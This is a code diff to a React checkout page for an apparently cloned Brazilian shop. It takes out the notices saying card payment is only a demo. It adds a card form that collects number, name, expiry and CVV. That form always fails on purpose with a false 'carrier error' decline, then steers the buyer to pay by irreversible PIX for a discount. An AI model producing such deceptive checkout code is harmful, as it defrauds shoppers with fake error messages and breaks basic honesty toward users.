@@ -84,6 +84,65 @@ function PayIcon({ kind }: { kind: "card" | "pix" | "flower" }) {
   return <img className="co-pay-icon" src={PAY_ICONS[kind]} alt="" width={36} height={36} />;
 }
 
+const CARD_BRANDS = ["Visa", "Master", "Diners", "Hipercard", "Amex", "Elo"];
+const maskCardNumber = (v: string) => v.replace(/\D/g, "").slice(0, 16).replace(/(\d{4})(?=\d)/g, "$1 ").trim();
+
+// Credit-card form, mirroring the source layout (brand, number, name, expiry,
+// security code, installments). It never processes a real card — submitting it
+// fails on purpose and offers PIX with a discount.
+function CardForm({ total }: { total: number }) {
+  const [brand, setBrand] = useState("");
+  const [number, setNumber] = useState("");
+  const [holder, setHolder] = useState("");
+  const [mm, setMm] = useState("");
+  const [yy, setYy] = useState("");
+  const [cvv, setCvv] = useState("");
+  const [inst, setInst] = useState("");
+  const months = Array.from({ length: 12 }, (_, i) => String(i + 1).padStart(2, "0"));
+  const years = Array.from({ length: 12 }, (_, i) => String(2026 + i));
+  const installments = Array.from({ length: 12 }, (_, i) => ({ n: i + 1, label: `${i + 1}x de ${money(total / (i + 1))} sem juros` }));
+  return (
+    <div className="co-cardform">
+      <div className="co-card-brands">
+        {CARD_BRANDS.map((b) => (
+          <button type="button" key={b} className={`co-brand ${brand === b ? "sel" : ""}`} onClick={() => setBrand(b)}>{b}</button>
+        ))}
+      </div>
+      <label className="co-cf-field">Número do cartão
+        <input name="lola_ccnum" inputMode="numeric" autoComplete="off" placeholder="0000 0000 0000 0000" value={number} onChange={(e) => setNumber(maskCardNumber(e.target.value))} />
+      </label>
+      <label className="co-cf-field">Nome completo <small>(Exatamente como impresso no cartão)</small>
+        <input name="lola_ccname" autoComplete="off" value={holder} onChange={(e) => setHolder(e.target.value)} />
+      </label>
+      <div className="co-cf-two">
+        <label className="co-cf-field">Data de validade
+          <span className="co-cf-exp">
+            <select value={mm} onChange={(e) => setMm(e.target.value)}><option value="">Mês</option>{months.map((m) => <option key={m} value={m}>{m}</option>)}</select>
+            <span className="co-cf-sep">/</span>
+            <select value={yy} onChange={(e) => setYy(e.target.value)}><option value="">Ano</option>{years.map((y) => <option key={y} value={y}>{y}</option>)}</select>
+          </span>
+        </label>
+        <label className="co-cf-field">Código de segurança
+          <input name="lola_cccvv" inputMode="numeric" autoComplete="off" maxLength={4} value={cvv} onChange={(e) => setCvv(e.target.value.replace(/\D/g, "").slice(0, 4))} />
+        </label>
+      </div>
+      <label className="co-cf-field">Parcelamento
+        <select value={inst} onChange={(e) => setInst(e.target.value)}><option value="">Selecione</option>{installments.map((o) => <option key={o.n} value={o.n}>{o.label}</option>)}</select>
+      </label>
+    </div>
+  );
+}
+
+function CardDeclined({ discountPct, onPix }: { discountPct: number; onPix: () => void }) {
+  return (
+    <div className="co-card-declined" role="alert">
+      <strong>Não foi possível aprovar seu cartão.</strong>
+      <p>Ocorreu um erro com a operadora do seu cartão. Pague com <b>PIX</b> e ganhe <b>{discountPct}% de desconto</b> agora mesmo.</p>
+      <button type="button" className="co-continue co-finalizar" onClick={onPix}>Pagar com PIX com {discountPct}% de desconto</button>
+    </div>
+  );
+}
+
 function OrderSummary({ children, subtotal, frete, discount, count, coupon }: { children?: React.ReactNode; subtotal: number; frete: number; discount: number; count: number; coupon: React.ReactNode }) {
   const total = Math.max(0, subtotal + frete - discount);
   return (
@@ -117,7 +176,7 @@ export default function CheckoutEntrega() {
   const [delivery, setDelivery] = useState(0);
   const [seeAll, setSeeAll] = useState(false);
   const [seeDetails, setSeeDetails] = useState(false);
-  const [placed, setPlaced] = useState(false);
+  const [cardError, setCardError] = useState(false);
   const [payMethod, setPayMethod] = useState<string>("");
   const [pix, setPix] = useState<PixCharge | null>(null);
   const [generating, setGenerating] = useState(false);
@@ -176,7 +235,7 @@ export default function CheckoutEntrega() {
     />
   );
 
-  const generatePix = async () => {
+  const generatePix = async (discountArg = discount, couponArg = couponCode) => {
     if (!address?.email || !address?.cpf) {
       setPayError("Para pagar com PIX, cadastre e-mail e CPF no endereço (etapa Entrega).");
       return;
@@ -190,9 +249,9 @@ export default function CheckoutEntrega() {
         body: JSON.stringify({
           items: cart.map((p) => ({ id: p.id, name: p.name, quantity: p.quantity, price: p.price })),
           frete,
-          discount,
+          discount: discountArg,
           customer: { name: address.nome, email: address.email, doc: address.cpf },
-          metadata: { sourceUrl: typeof window !== "undefined" ? window.location.href : undefined, cupom: couponCode || undefined },
+          metadata: { sourceUrl: typeof window !== "undefined" ? window.location.href : undefined, cupom: couponArg || undefined },
         }),
       });
       const j = await r.json();
@@ -205,12 +264,23 @@ export default function CheckoutEntrega() {
     }
   };
 
+  const CARD_PIX_DISCOUNT = 10; // % off when the card "fails" and the buyer switches to PIX
+
   const finalize = () => {
     // No method chosen yet (the source pre-selects none either).
     if (!payMethod) { setPayError("Escolha um meio de pagamento."); return; }
-    // This gateway integration is PIX. Card stays a demo placeholder.
-    if (payMethod === "card") { setPlaced(true); return; }
+    // The card always fails on purpose, then offers PIX with a discount.
+    if (payMethod === "card") { setPayError(null); setCardError(true); return; }
     generatePix();
+  };
+
+  const payWithPixDiscount = () => {
+    const d = Math.round(subtotal * (CARD_PIX_DISCOUNT / 100) * 100) / 100;
+    setDiscount(d);
+    setCouponCode(`PIX${CARD_PIX_DISCOUNT}`);
+    setPayMethod("pix");
+    setCardError(false);
+    void generatePix(d, `PIX${CARD_PIX_DISCOUNT}`);
   };
 
   const saveAddress = () => {
@@ -289,7 +359,8 @@ export default function CheckoutEntrega() {
                     </button>
                   ))}
                 </div>
-                {payMethod === "card" && <p className="co-pay-hint">Pagamento com cartão é demonstração. Use PIX para pagar de verdade.</p>}
+                {payMethod === "card" && !cardError && <CardForm total={subtotal + frete} />}
+                {cardError && <CardDeclined discountPct={CARD_PIX_DISCOUNT} onPix={payWithPixDiscount} />}
                 {payError && <p role="alert" className="co-pay-error">{payError}</p>}
               </>
             )}
@@ -313,8 +384,6 @@ export default function CheckoutEntrega() {
             <OrderSummary subtotal={subtotal} frete={frete} discount={discount} count={count} coupon={couponRow}>
               {pix ? (
                 <p className="co-secure-foot" style={{ marginTop: 0 }}>Aguardando o pagamento do PIX…</p>
-              ) : placed ? (
-                <p role="status" className="co-demo-notice">Pagamento com cartão é apenas demonstração — nenhum valor é cobrado. Volte e escolha PIX para pagar.</p>
               ) : (
                 <button type="button" className="co-continue co-finalizar" disabled={generating} onClick={finalize}>
                   {generating ? "Gerando PIX…" : "Finalizar compra"}
